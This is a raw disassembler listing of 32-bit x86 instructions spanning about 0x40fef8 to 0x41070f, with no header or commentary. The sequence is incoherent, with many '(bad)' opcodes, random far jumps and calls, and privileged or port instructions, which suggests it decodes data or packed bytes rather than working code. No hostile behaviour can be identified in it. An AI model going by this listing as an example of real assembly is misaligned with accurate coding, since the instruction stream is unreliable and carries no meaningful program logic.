  40fef8:	xor    cl,BYTE PTR [edx-0x2a]
  40fefb:	je     0x40ff39
  40fefd:	mov    edi,0x5f4021a7
  40ff02:	loopne 0x40ff32
  40ff04:	push   edx
  40ff05:	xchg   ebp,eax
  40ff06:	xor    eax,0x726ba44
  40ff0b:	xchg   esi,esp
  40ff0d:	mov    WORD PTR [ecx],cs
  40ff0f:	adc    dl,bl
  40ff11:	lods   eax,DWORD PTR ds:[esi]
  40ff12:	inc    ebp
  40ff13:	jb     0x40ff0f
  40ff15:	stc    
  40ff16:	call   0xf911:0x8871e9ba
  40ff1d:	les    eax,FWORD PTR [edi-0x4512f70d]
  40ff23:	imul   esi,DWORD PTR [edx+edx*1+0x62],0x39a8b6e8
  40ff2b:	mov    bh,0x3b
  40ff2d:	inc    ecx
  40ff2e:	jmp    0xa6ede1c
  40ff33:	adc    DWORD PTR [ebx-0x78df13a2],edi
  40ff39:	inc    ebx
  40ff3a:	retf   0xdf74
  40ff3d:	ins    DWORD PTR es:[edi],dx
  40ff3e:	add    ax,0xc199
  40ff42:	mov    ebx,0x7000779a
  40ff47:	push   0x6ee8db3c
  40ff4c:	push   ebp
  40ff4d:	sub    esp,edi
  40ff4f:	(bad)  
  40ff51:	cmovp  ebx,DWORD PTR [eax+0x30]
  40ff55:	rcr    BYTE PTR [ecx-0x44],0xfb
  40ff59:	cmp    esi,ebp
  40ff5b:	icebp  
  40ff5c:	push   esp
  40ff5d:	arpl   WORD PTR [esi],si
  40ff5f:	inc    ebp
  40ff60:	add    eax,0xd53a161f
  40ff65:	push   edx
  40ff66:	or     eax,0xb42f3a60
  40ff6b:	sbb    al,0xe9
  40ff6d:	cmp    DWORD PTR [edi+0x416ec11f],edx
  40ff73:	xlat   BYTE PTR ds:[ebx]
  40ff74:	and    dh,bh
  40ff76:	mov    ds:0x9f52450d,al
  40ff7b:	pop    esi
  40ff7c:	xchg   BYTE PTR [ecx+ecx*2+0x1d],dl
  40ff80:	ret    0xe406
  40ff83:	dec    ebp
  40ff84:	(bad)  
  40ff86:	cmc    
  40ff87:	inc    esp
  40ff88:	jne    0x40ffce
  40ff8a:	out    0xa0,al
  40ff8c:	stos   BYTE PTR es:[edi],al
  40ff8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff8e:	adc    DWORD PTR [ecx],0x33
  40ff91:	imul   ebx,DWORD PTR [ecx-0x68055a4],0x2b91ac48
  40ff9b:	inc    eax
  40ff9c:	inc    eax
  40ff9d:	out    0xea,al
  40ff9f:	sbb    eax,0x660af9f3
  40ffa4:	hlt    
  40ffa5:	push   esi
  40ffa6:	pop    ebp
  40ffa7:	mov    esi,DWORD PTR [eax-0x3f]
  40ffaa:	jae    0x40ffb9
  40ffac:	or     ebp,edi
  40ffae:	or     eax,esi
  40ffb0:	jns    0x40ff9c
  40ffb2:	(bad)  
  40ffb3:	fbld   TBYTE PTR [eax]
  40ffb5:	test   eax,0x32448d80
  40ffba:	jl     0x40ff90
  40ffbc:	adc    esi,DWORD PTR [edx-0x433b2a16]
  40ffc2:	push   ebp
  40ffc3:	cld    
  40ffc4:	js     0x40ffc0
  40ffc6:	sub    BYTE PTR [edx-0x639593c9],dh
  40ffcc:	or     BYTE PTR [ebx+0x33],0x48
  40ffd0:	mov    ds:0x3de0fc80,al
  40ffd5:	jnp    0x410022
  40ffd7:	and    bx,WORD PTR [ecx]
  40ffda:	js     0x40ffb1
  40ffdc:	gs cmp ah,cl
  40ffdf:	ret    
  40ffe0:	iret   
  40ffe1:	or     eax,0x2c95d846
  40ffe6:	data16 jne 0x41000a
  40ffe9:	in     eax,dx
  40ffea:	pop    esi
  40ffeb:	jle    0x40ff72
  40ffed:	imul   edi,DWORD PTR [edi-0x192e11f5],0x1eb561ab
  40fff7:	imul   ebx,DWORD PTR [edx+0x38f85719],0x11
  40fffe:	push   0x5be959c7
  410003:	daa    
  410004:	cwde   
  410005:	inc    edx
  410006:	outs   dx,BYTE PTR ds:[esi]
  410007:	and    bl,BYTE PTR [eax+0x42d90877]
  41000d:	ss jl  0x410084
  410010:	pop    ebx
  410011:	daa    
  410012:	adc    bl,al
  410014:	jge    0x40ffab
  410016:	sub    edi,esp
  410018:	(bad)  
  410019:	fidiv  WORD PTR [edx-0x60]
  41001c:	mov    WORD PTR [edi-0x3b7f9832],?
  410022:	call   0x4ced:0x62c41fe6
  410029:	icebp  
  41002a:	stc    
  41002b:	mov    dl,0x16
  41002d:	ins    BYTE PTR es:[edi],dx
  41002e:	(bad)  
  41002f:	cwde   
  410030:	cld    
  410031:	out    dx,al
  410032:	fcomp  st(0)
  410034:	(bad)  
  410035:	mov    esi,0x95bdea9b
  41003a:	push   esi
  41003b:	lahf   
  41003c:	sub    al,0x8
  41003e:	push   ds
  41003f:	fnstcw WORD PTR cs:[edi-0x74bf01a5]
  410046:	xchg   ebx,eax
  410047:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  410049:	jge    0x40ffe3
  41004b:	cmp    esp,DWORD PTR [eax*1-0x32f40082]
  410052:	ins    BYTE PTR es:[edi],dx
  410053:	ins    DWORD PTR es:[edi],dx
  410054:	lea    ebx,[ecx]
  410056:	sbb    edi,edi
  410058:	imul   esp,DWORD PTR [ebp+0x21],0xffffffbd
  41005c:	push   ss
  41005d:	scas   al,BYTE PTR es:[edi]
  41005e:	xor    dl,0x11
  410061:	rcl    eax,cl
  410063:	adc    BYTE PTR [eax-0x5],dl
  410066:	jmp    0x96c5e62f
  41006b:	mov    ecx,0x219dc3e7
  410070:	nop    DWORD PTR [ecx+0x2c]
  410074:	aam    0x50
  410076:	icebp  
  410077:	and    ecx,DWORD PTR [ebp+0x67]
  41007a:	jmp    0x5f8b:0x739df343
  410081:	xchg   esp,eax
  410082:	sub    DWORD PTR [esp+eax*4],ecx
  410085:	push   edx
  410086:	jne    0x41002d
  410088:	jle    0x410090
  41008a:	add    al,0xf3
  41008c:	fadd   DWORD PTR [edx-0x76]
  41008f:	jno    0x410099
  410091:	gs xchg edx,eax
  410093:	aaa    
  410094:	scas   eax,DWORD PTR es:[edi]
  410095:	xchg   esi,eax
  410096:	xchg   edi,eax
  410097:	jge    0x4100ce
  410099:	adc    dh,BYTE PTR [edi-0x50]
  41009c:	aas    
  41009d:	add    al,bl
  41009f:	mov    cl,0xd1
  4100a1:	sub    edi,DWORD PTR [edi+ebp*4]
  4100a4:	sbb    ch,BYTE PTR [edi-0x80]
  4100a7:	mov    BYTE PTR [esp+edx*4-0x5],dl
  4100ab:	add    eax,0xc9d468dd
  4100b0:	jmp    0x410119
  4100b2:	or     al,0x9b
  4100b4:	cli    
  4100b5:	pop    esi
  4100b6:	jno    0x410097
  4100b8:	cmp    dl,al
  4100ba:	in     al,0x3c
  4100bc:	sub    DWORD PTR [esi-0x26ba68ec],eax
  4100c2:	or     eax,0x1ea18bd1
  4100c7:	or     cl,BYTE PTR [edi]
  4100c9:	pusha  
  4100ca:	jb     0x4100c0
  4100cc:	mov    eax,ds:0xe432314e
  4100d1:	add    eax,0x77e40e50
  4100d6:	add    BYTE PTR [ebp+0x1b],dh
  4100d9:	stc    
  4100da:	mov    cl,0xfb
  4100dc:	jbe    0x410130
  4100de:	adc    BYTE PTR [ebx+ebx*8+0x51c51abe],bh
  4100e5:	push   edi
  4100e6:	das    
  4100e7:	jo     0x410161
  4100e9:	cmp    esp,DWORD PTR [edi]
  4100eb:	aaa    
  4100ec:	in     al,0x8
  4100ee:	push   eax
  4100ef:	fiadd  DWORD PTR [eax]
  4100f1:	dec    edi
  4100f2:	imul   ebp,ebp,0x2a
  4100f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4100f6:	shl    DWORD PTR [edx+0x1],1
  4100f9:	xor    DWORD PTR [ebp+0x142a23cd],ebx
  4100ff:	mov    edi,0x8fcf238
  410104:	(bad)  
  410105:	dec    ecx
  410106:	lea    eax,[ecx+edx*8+0x5f]
  41010a:	aam    0x56
  41010c:	bound  esi,QWORD PTR [ebx+0x269ebf97]
  410112:	pop    es
  410113:	or     BYTE PTR [eax+0x660ae817],al
  410119:	daa    
  41011a:	add    DWORD PTR [ecx-0x69],0x1f
  41011e:	aaa    
  41011f:	jmp    0x3a14:0x926ca2d9
  410126:	jmp    0x2b77:0xc014970d
  41012d:	cli    
  41012e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41012f:	xchg   DWORD PTR [ecx-0xd32fd5c],ebp
  410135:	sub    eax,0xb7a7f8b0
  41013a:	push   ss
  41013b:	enter  0xae25,0xa2
  41013f:	imul   edi,DWORD PTR [esi+0x61],0x52
  410143:	ss leave 
  410145:	imul   BYTE PTR [esi]
  410147:	loopne 0x4100ea
  410149:	or     ecx,DWORD PTR ss:0x1e6223f9
  410150:	mov    DWORD PTR [edi+ebp*1],ebp
  410153:	jns    0x410123
  410155:	cmp    eax,DWORD PTR [edx]
  410157:	push   esi
  410158:	shl    BYTE PTR [ebp-0xd],1
  41015b:	or     BYTE PTR [ecx],ch
  41015d:	xchg   edi,eax
  41015e:	cdq    
  41015f:	or     BYTE PTR [edi+0x59],dh
  410162:	inc    edi
  410163:	mov    bh,0x0
  410165:	mov    WORD PTR [esi+eiz*1],es
  410168:	bound  ebx,QWORD PTR [edx+edx*8-0x40]
  41016c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41016d:	jecxz  0x410159
  41016f:	fbld   TBYTE PTR [ebx-0x2c]
  410172:	mov    ds:0x9e7b59f3,eax
  410177:	sbb    eax,0xa6cf06ff
  41017c:	add    ebp,0x4483dd1f
  410182:	cld    
  410183:	(bad)  
  410184:	out    dx,eax
  410185:	(bad)  
  410186:	loopne 0x410162
  410188:	mov    edi,0x9893c363
  41018d:	sub    eax,0x2585cc2f
  410192:	fbstp  TBYTE PTR [ebx-0x286f0430]
  410198:	add    esi,ecx
  41019a:	es push ds
  41019c:	cmp    cl,BYTE PTR [esi+0x23]
  41019f:	push   cs
  4101a0:	add    al,0x15
  4101a2:	cdq    
  4101a3:	mov    ds:0x763c1073,eax
  4101a8:	mov    ds:0x9b8d4bdb,al
  4101ad:	(bad)  
  4101ae:	scas   eax,DWORD PTR es:[edi]
  4101af:	imul   ecx,DWORD PTR [eax-0x2074c985],0x8dcf6c45
  4101b9:	sub    ebp,DWORD PTR [ebx+eax*4-0x29]
  4101bd:	xor    esp,DWORD PTR [edx+0x6e]
  4101c0:	into   
  4101c1:	push   0xbab12ecb
  4101c6:	aaa    
  4101c7:	imul   ecx,DWORD PTR [esi+0x11006500],0x54db180e
  4101d1:	mov    eax,0x13df17ac
  4101d6:	ret    
  4101d7:	or     DWORD PTR [eax],ecx
  4101d9:	mov    edx,cs
  4101db:	mov    ds,WORD PTR [ecx+edi*8+0x3449941f]
  4101e2:	(bad)  
  4101e3:	sub    al,0x3c
  4101e5:	mov    bh,0x6b
  4101e7:	or     eax,0xac8f8c7d
  4101ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ed:	pop    eax
  4101ee:	mov    ebp,0x4cea122c
  4101f3:	fmul   QWORD PTR [ebp+0x715ea5cc]
  4101f9:	pop    ecx
  4101fa:	sbb    esp,DWORD PTR [eax+0x3d]
  4101fd:	inc    esp
  4101fe:	mov    dl,0xcc
  410200:	loope  0x410260
  410202:	fsubr  st,st(5)
  410204:	xchg   DWORD PTR [ebx-0x57],esp
  410207:	loope  0x4101c2
  410209:	ds fwait
  41020b:	out    dx,al
  41020c:	(bad)  
  41020d:	(bad)  
  41020e:	imul   eax,DWORD PTR [edx],0x1e303d8
  410214:	arpl   WORD PTR ds:0xc218351c,di
  41021a:	arpl   WORD PTR [ebx-0x71976d67],si
  410220:	pop    ds
  410221:	cld    
  410222:	imul   ecx,ebp,0xb6510e3e
  410228:	out    dx,ax
  41022a:	inc    eax
  41022b:	mov    edi,0x7deb806c
  410230:	jle    0x410284
  410232:	jmp    0xce742408
  410237:	jmp    0x410742
  41023c:	(bad)  
  41023d:	leave  
  41023e:	mov    dl,0xc9
  410241:	ror    edx,0xc9
  410244:	stos   BYTE PTR es:[edi],al
  410245:	inc    DWORD PTR [eax-0x6e]
  410248:	jns    0x410274
  41024a:	mov    eax,ds:0x7861ae59
  41024f:	js     0x4102bb
  410251:	jl     0x4102cb
  410253:	js     0x41022d
  410255:	test   DWORD PTR [ecx+edx*2-0x65f63472],eax
  41025c:	test   DWORD PTR [ecx+ecx*2+0x2c],ebp
  410260:	(bad)  
  410261:	jae    0x4101ee
  410263:	and    eax,0xbcc20fc3
  410268:	mov    cl,0x19
  41026a:	daa    
  41026b:	inc    esp
  41026c:	sub    bh,al
  41026e:	or     bl,BYTE PTR [esi-0x5]
  410271:	shr    al,1
  410273:	sahf   
  410274:	push   ebp
  410275:	cmp    eax,0x9d13e774
  41027a:	inc    edi
  41027b:	leave  
  41027c:	js     0x41022a
  41027e:	dec    esp
  41027f:	xchg   ebx,eax
  410280:	push   edi
  410281:	popa   
  410282:	dec    eax
  410283:	mov    esp,0xf684c4e
  410288:	dec    edi
  410289:	sbb    cl,ch
  41028b:	pop    ss
  41028c:	dec    ebp
  41028d:	hlt    
  41028e:	repnz add DWORD PTR [edi],esi
  410291:	xchg   esi,eax
  410292:	jecxz  0x410263
  410294:	shl    BYTE PTR [ecx-0x6fe4dd54],cl
  41029a:	jmp    0x20324515
  41029f:	push   0xa5c73784
  4102a4:	jmp    FWORD PTR ds:0x6d55dd52
  4102aa:	hlt    
  4102ab:	or     cl,BYTE PTR [esi-0x5f]
  4102ae:	test   DWORD PTR [eax+ebx*8+0x7bb564d8],0x39c5ed20
  4102b9:	das    
  4102ba:	xchg   ecx,eax
  4102bb:	inc    edi
  4102bc:	mov    dh,0xba
  4102be:	setle  BYTE PTR [edi+0x479213e9]
  4102c5:	pop    es
  4102c6:	aad    0x83
  4102c8:	lahf   
  4102c9:	shr    DWORD PTR [edi-0x73],cl
  4102cc:	pop    esp
  4102cd:	mov    eax,0xec04de7c
  4102d2:	stos   BYTE PTR es:[edi],al
  4102d3:	xchg   edi,eax
  4102d4:	dec    eax
  4102d5:	leave  
  4102d6:	adc    ecx,0xd5ff732c
  4102dc:	or     eax,0x250d2f70
  4102e1:	repz cld 
  4102e3:	adc    eax,edx
  4102e5:	fiadd  WORD PTR [esi+eax*2+0x61]
  4102e9:	push   0x66
  4102eb:	mov    ebp,0x1516776d
  4102f0:	icebp  
  4102f1:	aas    
  4102f2:	aaa    
  4102f3:	add    al,ch
  4102f5:	ss into 
  4102f7:	fneni(8087 only) 
  4102f9:	loop   0x41037a
  4102fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102fc:	mov    al,ds:0xf959f80a
  410301:	jle    0x410321
  410303:	cdq    
  410304:	ror    BYTE PTR cs:[esi],1
  410307:	xlat   BYTE PTR ds:[ebx]
  410308:	ss jnp 0x4102c3
  41030b:	mov    eax,0xb8076d88
  410310:	fwait
  410311:	push   ecx
  410312:	repz xlat BYTE PTR ds:[ebx]
  410314:	ficom  DWORD PTR ds:0xb0536d21
  41031a:	ret    
  41031b:	xlat   BYTE PTR ds:[ebx]
  41031c:	repz push eax
  41031e:	cwde   
  41031f:	aad    0x14
  410321:	xor    DWORD PTR [eax-0x1f3e99da],ecx
  410327:	xor    eax,0x3034c0ae
  41032c:	mov    esi,0x5deb1a46
  410331:	push   0x51
  410333:	lds    esi,FWORD PTR [esi+0xb50b4be]
  410339:	push   esp
  41033a:	jge    0x4103a6
  41033c:	out    dx,al
  41033d:	retf   0xc2d
  410340:	pop    ebx
  410341:	xchg   ecx,eax
  410342:	and    BYTE PTR [esi],bl
  410344:	inc    ebx
  410345:	lea    edi,[edx-0x49]
  410348:	or     al,0xc0
  41034a:	cmp    eax,0xf36126f8
  41034f:	push   edi
  410350:	cmp    ebp,DWORD PTR [eax-0x4475416c]
  410356:	dec    edi
  410357:	cmp    BYTE PTR [ecx-0x3a],ch
  41035a:	push   ebp
  41035b:	mov    dh,0x45
  41035d:	nop
  41035e:	outs   dx,DWORD PTR ds:[esi]
  41035f:	imul   eax,edx,0x16
  410362:	shr    DWORD PTR [esi-0x413be751],1
  410368:	and    bl,BYTE PTR [ebp-0x21c3b779]
  41036e:	mov    gs,ebp
  410370:	scas   eax,DWORD PTR es:[edi]
  410371:	jae    0x410339
  410373:	ja     0x410352
  410375:	sbb    al,0x6e
  410377:	and    al,0x95
  410379:	out    0x6c,eax
  41037b:	mov    al,ds:0x21166e5a
  410380:	jle    0x410349
  410382:	or     eax,0x56b6021f
  410387:	lahf   
  410388:	cwde   
  410389:	retf   
  41038a:	cmp    BYTE PTR [edi],cl
  41038c:	dec    edi
  41038d:	mov    eax,DWORD PTR [edi]
  41038f:	aam    0x49
  410391:	sbb    dl,BYTE PTR [ecx]
  410393:	adc    al,0x9d
  410395:	sub    ebp,DWORD PTR [eax+0x3022d638]
  41039b:	test   DWORD PTR [ebx+0x3d],edx
  41039e:	hlt    
  41039f:	or     DWORD PTR [esi+0x2d],ebx
  4103a2:	xchg   esi,eax
  4103a3:	xor    eax,0xda0f13ed
  4103a8:	xor    al,0x2a
  4103aa:	pop    ebp
  4103ab:	clc    
  4103ac:	pop    edi
  4103ad:	jno    0x410421
  4103af:	loop   0x4103b8
  4103b1:	mov    ebx,0x64d4838d
  4103b6:	loope  0x410380
  4103b8:	mov    ecx,0xd28e8962
  4103bd:	xchg   DWORD PTR [ebp+ecx*2-0x20],edi
  4103c1:	cmp    ah,BYTE PTR [edx+0x53]
  4103c4:	xchg   ebx,eax
  4103c5:	lods   al,BYTE PTR ds:[esi]
  4103c6:	loopne 0x41034d
  4103c8:	gs (bad) 
  4103ca:	aas    
  4103cb:	pop    ebx
  4103cc:	test   ah,bh
  4103ce:	je     0x410357
  4103d0:	lock adc al,BYTE PTR [edx-0x4e871348]
  4103d7:	xchg   ebx,eax
  4103d8:	sbb    ch,ah
  4103da:	leave  
  4103db:	cmc    
  4103dc:	push   ebx
  4103dd:	adc    al,0xa1
  4103df:	std    
  4103e0:	mov    esi,0xe900ebfb
  4103e5:	mov    al,0xb
  4103e7:	cmc    
  4103e8:	dec    esp
  4103e9:	(bad)  
  4103ea:	or     eax,0x89c80dbe
  4103ef:	cmp    ebx,DWORD PTR [ebp+ebx*1+0x6a7550e5]
  4103f6:	(bad)  
  4103f8:	inc    eax
  4103f9:	push   edi
  4103fa:	lea    edx,[edi+0x19]
  4103fd:	mov    ah,0x2c
  4103ff:	call   0x68c65167
  410404:	adc    bl,BYTE PTR [ebp-0x75]
  410407:	jbe    0x410473
  410409:	imul   esp,DWORD PTR [edi+esi*2-0x60],0x54
  41040e:	stc    
  41040f:	dec    esi
  410410:	pop    ebx
  410411:	mov    edx,0x4c48e574
  410416:	pop    edx
  410417:	pop    esp
  410418:	je     0x4103f7
  41041a:	jns    0x4103ed
  41041c:	retf   0x88e2
  41041f:	mov    ds:0x7075a21,eax
  410424:	lock push ecx
  410426:	inc    esp
  410427:	sahf   
  410428:	sub    ebp,DWORD PTR [ebx+0xc]
  41042b:	inc    esp
  41042c:	cwde   
  41042d:	xor    ecx,DWORD PTR [esp+0x6f]
  410431:	imul   edi,DWORD PTR [ecx],0x59c9588
  410437:	sti    
  410438:	xchg   esp,eax
  410439:	mov    al,ds:0xfe1a913a
  41043e:	ror    BYTE PTR [esi],cl
  410440:	inc    eax
  410441:	cmp    bl,BYTE PTR [edx]
  410443:	dec    esp
  410444:	adc    eax,0xb77e3e30
  410449:	outs   dx,BYTE PTR ds:[esi]
  41044a:	push   ss
  41044b:	xchg   DWORD PTR [eax+0x408cef92],ecx
  410451:	call   0x1b49:0xf430a88b
  410458:	fwait
  410459:	lds    ebx,FWORD PTR [esi+0x12]
  41045c:	mov    ecx,0x80309c4b
  410461:	pop    edi
  410462:	jb     0x4103e9
  410464:	hlt    
  410465:	pop    ds
  410466:	mov    eax,0xa37bcb76
  41046b:	rol    BYTE PTR [edi],cl
  41046d:	inc    edx
  41046e:	iret   
  41046f:	mov    al,0xe5
  410471:	fst    DWORD PTR [esi-0x5167cb2a]
  410477:	jne    0x410435
  410479:	mov    ah,0x28
  41047b:	ret    
  41047c:	sub    DWORD PTR [esi+eiz*2+0x7c97fd6f],esp
  410483:	leave  
  410484:	xlat   BYTE PTR ds:[ebx]
  410485:	out    0x6,eax
  410487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410488:	bound  edi,QWORD PTR [ecx]
  41048a:	add    al,0x47
  41048c:	mov    eax,ds:0x3be5d16a
  410491:	inc    edi
  410492:	loope  0x4104ad
  410494:	dec    ebp
  410495:	sbb    DWORD PTR [esi+0x1e],ecx
  410498:	call   0xbe2c6806
  41049d:	pushf  
  41049e:	cmp    eax,eax
  4104a0:	mov    dh,BYTE PTR [edi+0x8]
  4104a3:	loope  0x4104e1
  4104a5:	sub    al,BYTE PTR [edi+ebx*2+0x4759ea22]
  4104ac:	and    ch,BYTE PTR [esi+0x624738b8]
  4104b2:	imul   ecx,DWORD PTR [edi-0x6cb86732],0x8995fdc7
  4104bc:	fs ins DWORD PTR es:[edi],dx
  4104be:	sub    DWORD PTR [ebp-0x7e407217],0x8e6361f5
  4104c8:	dec    eax
  4104c9:	test   al,0x7f
  4104cb:	int    0xc7
  4104cd:	cmp    dh,ch
  4104cf:	push   ds
  4104d0:	pushf  
  4104d1:	mov    eax,0xbd81e930
  4104d6:	(bad)
  4104d9:	sti    
  4104da:	sub    eax,0x35cf260d
  4104df:	mov    dl,0x69
  4104e1:	and    ecx,DWORD PTR [ebp-0x3a4c2e12]
  4104e7:	sub    eax,DWORD PTR [ebx+0x3a]
  4104ea:	mov    edi,ss
  4104ec:	push   0xffffff9d
  4104ee:	jmp    0x4104bf
  4104f0:	mov    al,0x6b
  4104f2:	loope  0x41055f
  4104f4:	or     ecx,DWORD PTR [ebx+0x53c2622d]
  4104fa:	jle    0x41052f
  4104fc:	pop    ss
  4104fd:	jp     0x41055e
  4104ff:	inc    esi
  410500:	mov    eax,es
  410502:	cld    
  410503:	sbb    BYTE PTR [esi+0x39],dl
  410506:	sub    DWORD PTR [esi+esi*4+0x54],esi
  41050a:	out    dx,al
  41050b:	mov    eax,DWORD PTR [edx-0x4d]
  41050e:	sbb    edx,ecx
  410510:	(bad)  
  410511:	xchg   ebx,eax
  410512:	lock xor eax,0x484587c4
  410518:	jmp    FWORD PTR [edi+ebp*2-0x78ee4041]
  41051f:	ror    BYTE PTR [edi],cl
  410521:	jns    0x410566
  410523:	call   0xd9fe5cb5
  410528:	add    ebp,0xffffffaa
  41052b:	dec    esp
  41052c:	lds    eax,FWORD PTR [eax+0x7d]
  41052f:	daa    
  410530:	and    ebp,0xfffffff9
  410533:	add    al,0xa1
  410535:	pushf  
  410536:	and    BYTE PTR [edi],dh
  410538:	sbb    BYTE PTR [esi],bh
  41053a:	sbb    ebp,DWORD PTR [edi+esi*8+0x35280599]
  410541:	xor    DWORD PTR [ebx+edx*2+0x4e],eax
  410545:	or     eax,0xee8531ff
  41054a:	fdivrp st(7),st
  41054c:	test   DWORD PTR [edi-0x59dbf802],esi
  410552:	pop    ss
  410553:	fisub  DWORD PTR [edi]
  410555:	xchg   ebp,eax
  410556:	mov    al,ds:0xca916c22
  41055b:	pop    esp
  41055c:	inc    esi
  41055d:	scas   eax,DWORD PTR es:[edi]
  41055e:	cmc    
  41055f:	xchg   esp,eax
  410560:	ss xchg edi,eax
  410562:	outs   dx,DWORD PTR ds:[esi]
  410563:	iret   
  410564:	retf   0xd879
  410567:	test   BYTE PTR [ebx+0x5d1d3764],bh
  41056d:	xchg   ebx,eax
  41056e:	mov    dh,0xc6
  410570:	xor    eax,0xefd95710
  410575:	sub    eax,DWORD PTR [esi]
  410577:	xchg   edx,eax
  410578:	xor    dh,dl
  41057a:	das    
  41057b:	fistp  WORD PTR [ebx]
  41057d:	adc    eax,0x6a10d8ed
  410582:	loopne 0x41054a
  410584:	mov    esi,0xeda314a5
  410589:	sub    BYTE PTR [esi-0x1d8646b],cl
  41058f:	fisttp DWORD PTR [ebx+ebp*8+0x53]
  410593:	pop    ebx
  410594:	lahf   
  410595:	and    DWORD PTR [eax-0xbb6dee7],esi
  41059b:	jle    0x410595
  41059d:	pop    edi
  41059e:	mov    ah,0x6a
  4105a0:	adc    BYTE PTR [edx],cl
  4105a2:	jne    0x410607
  4105a4:	pusha  
  4105a5:	iret   
  4105a6:	imul   edx,esi,0x133a78cb
  4105ac:	push   edi
  4105ad:	xchg   ebx,eax
  4105ae:	xchg   esi,eax
  4105af:	mov    fs:0x5af8b7d3,eax
  4105b5:	in     al,0x32
  4105b7:	dec    ecx
  4105b8:	push   edi
  4105b9:	adc    DWORD PTR [edx],esp
  4105bb:	bound  ecx,QWORD PTR [eax]
  4105bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105be:	mov    esi,0x847e8197
  4105c3:	(bad)  
  4105c4:	pop    edi
  4105c5:	mov    ds:0x3cfccc21,eax
  4105ca:	xor    BYTE PTR [eax+0x1c859ee5],dl
  4105d0:	fdivr  QWORD PTR [edx-0xe]
  4105d3:	lods   al,BYTE PTR ds:[esi]
  4105d4:	loopne 0x4105d2
  4105d6:	inc    BYTE PTR [ecx-0xbdc388e]
  4105dc:	push   ss
  4105dd:	mov    dl,0x59
  4105df:	mov    eax,?
  4105e1:	repz jno 0x4105ca
  4105e4:	aam    0x39
  4105e6:	retf   
  4105e7:	push   es
  4105e8:	jns    0x410664
  4105ea:	and    eax,0xcbfa144b
  4105ef:	mov    eax,0x1f10cc6f
  4105f4:	or     cx,0x27
  4105f8:	jno    0x410595
  4105fa:	leave  
  4105fb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105fd:	cld    
  4105fe:	cmp    ecx,esp
  410600:	pop    edi
  410601:	stos   BYTE PTR es:[edi],al
  410602:	dec    ebp
  410603:	pop    esp
  410604:	adc    bh,BYTE PTR [ecx*8+0x5d7d77da]
  41060b:	sub    eax,0x2784a51e
  410610:	mov    ds:0x417e7ed7,al
  410615:	dec    esp
  410616:	jle    0x410681
  410618:	mov    WORD PTR [edi],ss
  41061a:	das    
  41061b:	inc    ebx
  41061c:	retf   
  41061d:	add    bl,ah
  41061f:	outs   dx,DWORD PTR ds:[esi]
  410620:	mov    esp,0xeba628dd
  410625:	popf   
  410626:	xor    al,0xc0
  410628:	xchg   esp,eax
  410629:	imul   edi,DWORD PTR [esi+0x3d],0xfffffff6
  41062d:	mov    bh,0xbc
  41062f:	push   esi
  410630:	test   eax,0xf85c16a
  410635:	in     eax,0xe5
  410637:	(bad)  
  410638:	gs ret 
  41063a:	inc    eax
  41063b:	shl    bh,cl
  41063d:	mov    bl,0xc2
  41063f:	ret    0x538d
  410642:	pop    ebx
  410643:	clc    
  410644:	fs mov ebp,0xc3b0518d
  41064a:	stos   DWORD PTR es:[edi],eax
  41064b:	lods   eax,DWORD PTR ss:[esi]
  41064d:	call   0xa4792d5b
  410652:	dec    eax
  410653:	clc    
  410654:	lds    ebp,FWORD PTR [eax-0x5b]
  410657:	jmp    0xc9e0e7c5
  41065c:	push   0x276e69f2
  410661:	sar    BYTE PTR [ecx-0x44],cl
  410664:	fldcw  WORD PTR [esi+0x5c60568d]
  41066a:	add    bh,bl
  41066c:	jne    0x4105ee
  41066e:	mov    ch,0x3d
  410670:	call   0x9221:0xbbc8637f
  410677:	addr16 pop ecx
  410679:	test   BYTE PTR [esi-0x2198afda],cl
  41067f:	mov    bl,0x4c
  410681:	mov    al,ds:0xc50ec0a8
  410686:	mov    BYTE PTR [edx],bl
  410688:	or     al,0xc6
  41068a:	jnp    0x4106f5
  41068c:	mov    ebp,0xf083a734
  410691:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410692:	outs   dx,BYTE PTR ds:[esi]
  410693:	cs sub al,0x76
  410696:	mov    bl,0xe
  410698:	pop    edi
  410699:	(bad)  
  41069a:	xlat   BYTE PTR ds:[ebx]
  41069b:	xchg   DWORD PTR [ebx],ecx
  41069d:	push   edi
  41069e:	scas   al,BYTE PTR es:[edi]
  41069f:	sub    dl,BYTE PTR [edi-0x28]
  4106a2:	dec    ebp
  4106a3:	xchg   esp,eax
  4106a4:	das    
  4106a5:	jp     0x41071d
  4106a7:	mov    ch,BYTE PTR [edi-0x3c800f55]
  4106ad:	lods   eax,DWORD PTR ds:[esi]
  4106ae:	jge    0x410648
  4106b0:	sahf   
  4106b1:	sbb    ecx,DWORD PTR ds:0x34cf083c
  4106b7:	je     0x4106bd
  4106b9:	loopne 0x4106c3
  4106bb:	add    BYTE PTR [edi],0xa8
  4106be:	daa    
  4106bf:	imul   eax,DWORD PTR [eax-0x388b6d76],0x588d87ce
  4106c9:	jbe    0x4106dd
  4106cb:	arpl   si,cx
  4106cd:	mov    ah,0xe3
  4106cf:	push   ebx
  4106d0:	sub    eax,0x86050726
  4106d5:	aad    0x18
  4106d7:	xchg   ecx,eax
  4106d8:	mov    cl,0xbd
  4106da:	xchg   BYTE PTR [ecx],cl
  4106dc:	hlt    
  4106dd:	aas    
  4106de:	jg     0x4106e4
  4106e0:	push   0x7a720f6f
  4106e5:	push   edi
  4106e6:	and    ax,WORD PTR ds:[ebp+0x774d5fb8]
  4106ee:	pusha  
  4106ef:	mov    ebp,0x4d54b38f
  4106f4:	sbb    esp,0x6bebdfa2
  4106fa:	pop    ecx
  4106fb:	mov    edi,0x86da962b
  410700:	out    dx,eax
  410701:	stos   DWORD PTR es:[edi],eax
  410702:	add    BYTE PTR [edi+0x2b65eef],dl
  410708:	pop    ss
  410709:	ret    
  41070a:	inc    ebp
  41070b:	pop    esi
  41070c:	aam    0xc4
  41070e:	inc    ebx
  41070f:	out    dx,eax
